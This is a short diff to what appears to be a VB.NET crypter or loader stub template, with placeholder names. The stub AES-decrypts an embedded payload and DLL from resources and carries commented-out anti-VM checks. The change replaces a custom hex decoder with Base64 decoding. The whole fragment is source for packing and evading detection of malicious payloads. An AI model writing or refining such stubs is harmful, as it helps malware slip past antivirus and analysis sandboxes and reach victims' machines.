@@ -95,8 +95,8 @@ Public Class %Class1%
 		 Dim %DecAdd% = %AES_Decrypt%(%Res%.GetObject("%EncyptedPayload%"),"%KEY%")
 	     Dim %DecDLL% = %AES_Decrypt%(%Res%.GetObject("%EncryptedDLL%"),"%KEY%")
 	    
-		 Dim %STRHEX% = %STRHEXFunc%(%DecAdd%)
-	     Dim %DLL% = %STRHEXFunc%(%DecDLL%)
+		 Dim %STRHEX% = Convert.FromBase64String(%DecAdd%)
+	     Dim %DLL% = Convert.FromBase64String(%DecDLL%)
 
         
 
@@ -221,6 +221,5 @@ Public Class %Class1%
 '%ANTIVM%            Catch ex As Exception
 '%ANTIVM%            End Try
 '%ANTIVM%        End Sub
-
 
 	End Class
